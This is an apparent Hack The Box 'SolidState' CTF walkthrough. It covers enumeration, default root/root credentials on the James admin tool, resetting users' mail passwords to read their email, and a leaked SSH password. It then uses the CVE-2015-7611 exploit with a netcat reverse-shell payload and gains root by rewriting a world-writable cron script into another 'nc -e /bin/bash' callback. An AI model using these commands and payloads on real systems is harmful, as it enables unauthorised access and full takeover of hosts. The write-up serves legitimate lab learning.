# Hackthebox SolidState

## Enumeration

First do the standard portscanning of every tcp port on the system.

```
$ nmap -A -T4 -p- 10.129.29.189         
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-02 10:52 EST
Nmap scan report for 10.129.29.189
Host is up (0.035s latency).
Not shown: 65530 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 77:00:84:f5:78:b9:c7:d3:54:cf:71:2e:0d:52:6d:8b (RSA)
|   256 78:b8:3a:f6:60:19:06:91:f5:53:92:1d:3f:48:ed:53 (ECDSA)
|_  256 e4:45:e9:ed:07:4d:73:69:43:5a:12:70:9d:c4:af:76 (ED25519)
25/tcp   open  smtp?
|_smtp-commands: Couldn't establish connection on port 25
110/tcp  open  pop3?
119/tcp  open  nntp?
4555/tcp open  rsip?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Gobuster scans for directories

```
$ gobuster dir -u http://10.129.29.189 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -x txt,php 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.29.189
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              txt,php
[+] Timeout:                 10s
===============================================================
2022/01/02 11:14:52 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 315] [--> http://10.129.29.189/images/]
/assets               (Status: 301) [Size: 315] [--> http://10.129.29.189/assets/]
/README.txt           (Status: 200) [Size: 963]                                   
/LICENSE.txt          (Status: 200) [Size: 17128]                                 
/server-status        (Status: 403) [Size: 301]                  
```

README.txt file

```
Solid State by HTML5 UP
html5up.net | @ajlkn
Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)


After a somewhat extended break from HTML5 UP (to work on a secret-ish new project --
more on that later!) I'm back with a brand new design: Solid State, a slick new multi-
pager that combines some of the ideas I've played with over at Pixelarity with an "angular"
sort of look. Hope you dig it :)

Demo images* courtesy of Unsplash, a radtastic collection of CC0 (public domain) images
you can use for pretty much whatever.

(* = not included)

AJ
aj@lkn.io | @ajlkn


Credits:

	Demo Images:
		Unsplash (unsplash.com)

	Icons:
		Font Awesome (fortawesome.github.com/Font-Awesome)

	Other:
		jQuery (jquery.com)
		html5shiv.js (@afarkas @jdalton @jon_neal @rem)
		background-size polyfill (github.com/louisremi)
		Misc. Sass functions (@HugoGiraudel)
		Respond.js (j.mp/respondjs)
		Skel (skel.io)
```

Connection test to the smtp server

```
$ telnet 10.129.29.189 25
Trying 10.129.29.189...
Connected to 10.129.29.189.
Escape character is '^]'.
VRFY root
220 solidstate SMTP Server (JAMES SMTP Server 2.3.2) ready Sun, 2 Jan 2022 11:05:43 -0500 (EST)
502 5.3.3 VRFY is not supported
```

## Vulnerability Scanning

Basic nmap vulnerability scan

```
$ nmap --script vuln 10.129.29.189                                                    
Starting Nmap 7.91 ( https://nmap.org ) at 2022-01-02 11:04 EST
Nmap scan report for 10.129.29.189
Host is up (0.035s latency).
Not shown: 995 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
25/tcp  open  smtp
|_sslv2-drown: 
80/tcp  open  http
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.129.29.189
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.129.29.189:80/
|     Form id: name
|     Form action: #
|     
|     Path: http://10.129.29.189:80/about.html
|     Form id: name
|_    Form action: #
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /README.txt: Interesting, a readme.
|_  /images/: Potentially interesting directory w/ listing on 'apache/2.4.25 (debian)'
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
110/tcp open  pop3
|_sslv2-drown: 
119/tcp open  nntp
|_sslv2-drown: 
```

James SMTP server has interesting vulnerabilities

```
$ searchsploit james 2.3.2
-------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                      |  Path
-------------------------------------------------------------------- ---------------------------------
Apache James Server 2.3.2 - Insecure User Creation Arbitrary File W | linux/remote/48130.rb
Apache James Server 2.3.2 - Remote Command Execution                | linux/remote/35513.py
-------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Also the James remote administration tool uses the default root/root credentials

```
$ telnet 10.129.29.189 4555                                                                     1 ⨯
Trying 10.129.29.189...
Connected to 10.129.29.189.
Escape character is '^]'.
JAMES Remote Administration Tool 2.3.2
Please enter your login and password
Login id:
root
Password:
root
Welcome root. HELP for a list of commands
```

List the users that are on the mail server using the remote administration tool

```
Welcome root. HELP for a list of commands
listusers
Existing accounts 6
user: james
user: ../../../../../../../../etc/bash_completion.d
user: thomas
user: john
user: mindy
user: mailadmin
```

We can change their passwords and see if there are any interesting emails to read.

```
Welcome root. HELP for a list of commands
setpassword mindy 123
Password for mindy reset
setpassword thomas 123
Password for thomas reset
setpassword john 123
Password for john reset
setpassword mailadmin 123
Password for mailadmin reset
setpassword james 123
Password for james reset
```

And now we can login to port 110 (POP3) to read their mails

John's mail

```
 telnet 10.129.29.189 110                                                                                                1 ⨯
Trying 10.129.29.189...
Connected to 10.129.29.189.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER john
+OK
PASS 123
+OK Welcome john
LIST
+OK 1 743
1 743
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <9564574.1.1503422198108.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: john@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <john@localhost>;
          Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:16:20 -0400 (EDT)
From: mailadmin@localhost
Subject: New Hires access
John, 

Can you please restrict mindy's access until she gets read on to the program. Also make sure that you send her a tempory password to login to her accounts.

Thank you in advance.

Respectfully,
James
```

And even more interestingly Mindy's emails

```
$ telnet 10.129.29.189 110                                                                                                1 ⨯
Trying 10.129.29.189...
Connected to 10.129.29.189.
Escape character is '^]'.
+OK solidstate POP3 server (JAMES POP3 Server 2.3.2) ready 
USER mindy
+OK
PASS 123
+OK Welcome mindy
LIST
+OK 2 1945
1 1109
2 836
.
RETR 1
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <5420213.0.1503422039826.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 798
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:13:42 -0400 (EDT)
From: mailadmin@localhost
Subject: Welcome

Dear Mindy,
Welcome to Solid State Security Cyber team! We are delighted you are joining us as a junior defense analyst. Your role is critical in fulfilling the mission of our orginzation. The enclosed information is designed to serve as an introduction to Cyber Security and provide resources that will help you make a smooth transition into your new role. The Cyber team is here to support your transition so, please know that you can call on any of us to assist you.

We are looking forward to you joining our team and your success at Solid State Security. 

Respectfully,
James
.
RETR 2
+OK Message follows
Return-Path: <mailadmin@localhost>
Message-ID: <16744123.2.1503422270399.JavaMail.root@solidstate>
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Delivered-To: mindy@localhost
Received: from 192.168.11.142 ([192.168.11.142])
          by solidstate (JAMES SMTP Server 2.3.2) with SMTP ID 581
          for <mindy@localhost>;
          Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
Date: Tue, 22 Aug 2017 13:17:28 -0400 (EDT)
From: mailadmin@localhost
Subject: Your Access

Dear Mindy,


Here are your ssh credentials to access the system. Remember to reset your password after your first login. 
Your access is restricted at the moment, feel free to ask your supervisor to add any commands you need to your path. 

username: mindy
pass: P@55W0rd1!2@

Respectfully,
James
```



## Initial Access

### ssh

Login with ssh works with the username mindy and the password found in email.

### CVE-2015-7611

A bug in Apache James version 2.3.2 enables an attacker to execute arbitrary commands on the machine running the server

```
$ cp /usr/share/exploitdb/exploits/linux/remote/35513.py .
```

Replace the default payload with a reverse shell.

```
payload = 'nc -e /bin/bash 10.10.14.23 6666'
```

Set up a listener and run the script

```
 pyenv activate my-virtual-env-2.7.18                                                          1 ⨯
pyenv-virtualenv: prompt changing will be removed from future release. configure `export PYENV_VIRTUALENV_DIS(my-vi(my-virtu(m(((my-virtual-env-2.7.18) ┌──(my-virtual-env-2.7.18)(kali㉿kali)-[~/…/CTF/hackthebox/SolidState/CVE-2015-7611]
└─$ /home/kali/.pyenv/versions/my-virtual-env-2.7.18/bin/python 35513.py 10.129.29.189
[+]Connecting to James Remote Administration Tool...
[+]Creating user...
[+]Connecting to James SMTP server...
[+]Sending payload...
[+]Done! Payload will be executed once somebody logs in.
                                                                                                                                
(my-virtual-env-2.7.18) ┌──(my-virtual-env-2.7.18)(kali㉿kali)-[~/…/CTF/hackthebox/SolidState/CVE-2015-7611]
└─$
```

Logging in as mindy triggers the revershe shell

```
$ nc -nvlp 6666          
listening on [any] 6666 ...
connect to [10.10.14.23] from (UNKNOWN) [10.129.29.189] 54112
ls -al
total 28
drwxr-x--- 4 mindy mindy 4096 Nov 18  2020 .
drwxr-xr-x 4 root  root  4096 Aug 22  2017 ..
lrwxrwxrwx 1 root  root     9 Nov 18  2020 .bash_history -> /dev/null
-rw-r--r-- 1 root  root     0 Aug 22  2017 .bash_logout
-rw-r--r-- 1 root  root   338 Aug 22  2017 .bash_profile
-rw-r--r-- 1 root  root  1001 Aug 22  2017 .bashrc
drwxr-x--- 2 mindy mindy 4096 Aug 22  2017 bin
-rw------- 1 root  root     0 Aug 22  2017 .rhosts
-rw------- 1 root  root     0 Aug 22  2017 .shosts
drw------- 2 root  root  4096 Aug 22  2017 .ssh
-rw------- 1 mindy mindy   33 Nov 18  2020 user.txt
whoami
mindy
```

## Privilege Escalation

For further logins it is quicker to escape mindy's limited rbash with

```
$ sshpass -p 'P@55W0rd1!2@' ssh mindy@10.129.200.16 -t bash             127 ⨯
${debian_chroot:+($debian_chroot)}mindy@solidstate:~$
```

Transfering PSpy (https://github.com/DominicBreuker/pspy) to the host and monitoring processes we can see a script /opt/tmp.py is executed every three minutes as root, and it is word writable. Change it to a reverse shell.

```
#!/usr/bin/env python
import os
import sys
try:
     os.system('nc -e /bin/bash 10.10.14.23 4545')
except:
     sys.exit()
```

And set up a listener

```
$ nc -nvlp 4545          
listening on [any] 4545 ...
connect to [10.10.14.23] from (UNKNOWN) [10.129.200.16] 41806
whoami
root
ls -al /root/root.txt
-rw------- 1 root root 33 Nov 18  2020 /root/root.txt
```

